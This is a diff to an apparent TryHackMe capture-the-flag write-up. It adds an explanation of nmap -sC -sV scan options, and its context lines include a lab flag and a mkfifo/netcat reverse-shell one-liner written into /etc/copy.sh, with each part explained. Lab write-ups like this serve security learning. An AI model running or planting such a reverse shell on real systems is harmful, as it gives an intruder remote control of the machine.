@@ -487,6 +487,12 @@ THM{6637f41d0177b6f37cb20d775124699f}
 35. `cat /root/{ROOT FLAG}.txt`
 
 # Dissecting Some Commands
+`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
++ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
++ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
++ `> {FILENAME1}.txt` redirects the results into a text file
+  
+
 `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh`
 + `rm /tmp/f` to remove the file names "**/tmp/f**" if it exists
 + `mkfifo /thmp/f` to create a named pipe (FIFO) called "**/tmp/f**"
